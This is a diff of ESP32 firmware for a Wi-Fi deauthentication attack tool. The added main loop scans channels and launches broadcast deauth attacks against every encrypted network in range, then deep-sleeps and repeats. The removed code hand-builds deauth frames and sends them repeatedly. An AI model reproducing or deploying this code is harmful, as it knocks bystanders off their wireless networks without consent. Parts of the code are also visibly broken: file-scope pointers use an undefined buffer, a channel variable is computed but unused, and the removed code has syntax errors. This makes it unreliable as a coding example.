@@ -6,13 +6,25 @@ extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32
 // -----------------------------------------
 #include "WiFi.h"
 #include "esp_wifi.h"
+#include "esp_pm.h"
 
 // Constant Statements
 // -----------------------------------------
 // GPIO 2 CONSTANT
-#define LED_PIN 2
-// Wifi Base Channel Constant
-#define BASE_CHAN 8
+const int LED_PIN = 2;
+
+// Deauth Constants
+// -----------------------------------------
+const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
+const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
+const mac_hdr_t *mac_header = &packet->hdr;
+
+const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
+
+// Power Save Constants
+// -----------------------------------------
+#define uS_TO_S_FACTOR 1000000ULL
+const int TIME_TO_SLEEP = 300;
 
 // Deauth Constants
 // -----------------------------------------
@@ -51,6 +63,10 @@ void blink_led(int num_times, int blink_duration);
 // ----------------------------------------------
 void net_conf();
 int scan_net(void);
+void initPowerManager();
+void enableSleep();
+void startSleep();
+void print_wakeup_reason();
 
 // ==========================================
 // Deauth Variables -------------------------
@@ -80,6 +96,7 @@ int retransmissionSessions = 3; // Number of times to repeat the retransmission 
 
 // ===============================================================
 // types
+// ---------------------------------------------------------------
 typedef struct {
   uint8_t frame_control[2] = { 0xC0, 0x00 };
   uint8_t duration[2];
@@ -100,11 +117,34 @@ typedef struct {
   uint8_t addr4[6];
 } mac_hdr_t;
 
+typedef enum {
+  WIFI_PKT_MGMT,  /**< Management frame, indicates 'buf' argument is wifi_promiscuous_pkt_t */
+  WIFI_PKT_CTRL,  /**< Control frame, indicates 'buf' argument is wifi_promiscuous_pkt_t */
+  WIFI_PKT_DATA,  /**< Data frame, indiciates 'buf' argument is wifi_promiscuous_pkt_t */
+  WIFI_PKT_MISC  /**< Other type, such as MIMO etc. 'buf' argument is wifi_promiscuous_pkt_t but the payload is zero length. */
+} wifi_promiscuous_pkt_type_t;
+
+typedef struct {
+  unsigned vers:2;
+  wifi_promiscuous_pkt_type_t type:2;
+  wifi_mgmt_subtypes_t subtype:4;
+  unsigned ds:2;
+  unsigned moreFrag:1;
+  unsigned retry:1;
+  unsigned pwrMgt:1;
+  unsigned moreData:1;
+  unsigned protect:1;
+  unsigned order:1;
+} __attribute__((packed)) wifi_80211_fctl;
+
 typedef struct {
   mac_hdr_t hdr;
   uint8_t payload[0];
 } wifi_packet_t;
 
+// ------------------------------------------------------------------------------------------
+// Functions
+// ------------------------------------------------------------------------------------------
 const wifi_promiscuous_filter_t filt = {
   .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
 };
@@ -115,13 +155,25 @@ int eliminated_stations;
 
 esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 
-IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
-  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
-  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
-  const mac_hdr_t *mac_header = &packet->hdr;
+//*****************************************************************************
+// ESP32 Power Management Functions
+//*****************************************************************************
+//void initPowerManager() {
+//  // ESP32 power management settings
+//  esp_pm_config_esp32_t esp_pm_config_esp32;
+//  esp_pm_config_esp32.max_cpu_freq = RTC_CPU_FREQ_240M;
+//  esp_pm_config_esp32.min_cpu_freq = RTC_CPU_FREQ_XTAL;
+//  esp_pm_config_esp32.light_sleep_enable = true;
+//  esp_pm_configure(&esp_pm_config_esp32);
+//
+//  // Turn off the Wi-Fi to save power
+//  WiFi.mode(WIFI_OFF);
+//}
 
-  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);
-
+// ----------------------------------------------------------------------------------------------
+// Sniffer Function |  wifi_promiscuous_pkt_type_t type
+// ----------------------------------------------------------------------------------------------
+IRAM_ATTR void sniffer(void *buf) {
   if (packet_length < 0) return;
 
   if (deauth_type == DEAUTH_TYPE_SINGLE) {
@@ -143,6 +195,9 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
   BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
 }
 
+//-------------------------------------------------
+// Start Deauthentication
+// -----------------------------------------------
 void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
   eliminated_stations = 0;
   deauth_type = attack_type;
@@ -166,33 +221,12 @@ void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
   esp_wifi_set_promiscuous_rx_cb(&sniffer);
 }
 
+// ---------------------------------------------------------
+// Stop Deauthentication
+// ---------------------------------------------------------
 void stop_deauth() {
   DEBUG_PRINTLN("Stopping Deauth-Attack..");
   esp_wifi_set_promiscuous(false);
-}
-
-// ====================================================================================
-// Scan shit
-// ------------------------------------------------------------------------------------
-int scan_net(void) {
-  char err = false;
-  int ii = 0;
-  while (ii < 10) {
-    for (int i = 0; i < ch_array; i++) {
-      esp_wifi_set_channel(i, WIFI_SECOND_CHAN_NONE);
-      Serial.println("Set channel to %d.\n", i);
-      int n = WiFi.scanNetworks();
-      if (n >= 1) {
-        for (int i = 0; i < n; i++) {
-          enc_type = WiFi.encryptionType(i);
-          if (enc_type != "WIFI_AUTH_OPEN"){
-            start_deauth(
-            };
-          };
-        };
-      delay(10)
-    }
-  }
 }
 
 // ====================================================================================
@@ -224,55 +258,42 @@ void setup() {
   Serial.println("Scanning for networks...");
 }
 
-// MAIN -----------
+// ----------------------------------------------------------------------
+// MAIN LOOP
 // ----------------------------------------------------------------------
 void loop() {
-  // Scan for networks
-  int numNetworks = WiFi.scanNetworks();
-  Serial.print("Networks found: ");
-  Serial.println(numNetworks);
-
-  for (int i = 0; i < numNetworks; ++i) {
-    Serial.print(i + 1);
-    Serial.print(": ");
-    Serial.print(WiFi.SSID(i));
-    Serial.print(" (");
-    Serial.print(WiFi.BSSIDstr(i));
-    Serial.print(") on channel ");
-    Serial.println(WiFi.channel(i));
-
-    // Set the correct channel for sending deauth frames
-    esp_wifi_set_channel(WiFi.channel(i), WIFI_SECOND_CHAN_NONE);
-
-    // Construct deauth frame
-    uint8_t deauthPacket[26] = {
-      0xC0, 0x00,  // Frame Control (Deauth frame)
-      0xFF, 0xFF,  // Duration
-      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast Destination MAC
-      WiFi.BSSID(i)[0], WiFi.BSSID(i)[1], WiFi.BSSID(i)[2], // AP BSSID
-      WiFi.BSSID(i)[3], WiFi.BSSID(i)[4], WiFi.BSSID(i)[5], // AP BSSID
-      WiFi.BSSID(i)[0], WiFi.BSSID(i)[1], WiFi.BSSID(i)[2], // AP BSSID
-      WiFi.BSSID(i)[3], WiFi.BSSID(i)[4], WiFi.BSSID(i)[5], // AP BSSID
-      0x00, 0x00  // Sequence Control
-    };
-
-
-    for (int r = 0; r < retransmissionSessions; ++r) {
-      Serial.print("Starting retransmission session ");
-      Serial.print(r + 1);
-      Serial.print(" to network: ");
-      Serial.println(WiFi.SSID(i));
-
-      // Spam multiple deauth frames to increase effectiveness(Packet Loss Prevention)
-      for (int j = 0; j < deauthPacketRetransmissions; ++j) {
-        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
-        Serial.print("Deauth packet ");
-        Serial.print(j + 1);
-        Serial.print(" sent to network: ");
-        Serial.println(WiFi.SSID(i));
-        delay(send_delay); // Can reduce this further if desired(Prevents Overheating of the chip)
-      }
+  char err = false;
+  int ii = 0;
+  size_t size_charray = sizeof(CH_ARRAY) / sizeof(CH_ARRAY[0]);
+  while (ii < SCAN_ROUNDS)
+  {
+    int i;
+    for (int i = 0; i < size_charray; i++)
+    {
+      int wifi_channel = CH_ARRAY[i];
+      esp_wifi_set_channel(i, WIFI_SECOND_CHAN_NONE);
+      Serial.printf("Set channel to %d.\n", i);
+      int n = WiFi.scanNetworks();
+      if (n >= 1)
+      {
+        for (int i = 0; i < n; i++)
+        {
+          if (WiFi.encryptionType(i) != WIFI_AUTH_OPEN)
+          {
+            start_deauth(i, DEAUTH_TYPE_ALL, 0x7d3);
+          };
+        };
+      };
+      delay(scan_delay);
     }
+    ii++;
   }
-  delay(scan_delay); // delay between scans to prevent constant scanning overload
+  // Sleep to conserve power
+  Serial.println("Going to sleep now");
+  esp_sleep_enable_timer_wakeup(TIME_TO_SLEEP * uS_TO_S_FACTOR);
+  Serial.println("Setup ESP32 to sleep for every " + String(TIME_TO_SLEEP) +
+  " Seconds");
+  Serial.flush();
+  esp_deep_sleep_start();
+  Serial.println("This will never be printed");
 }
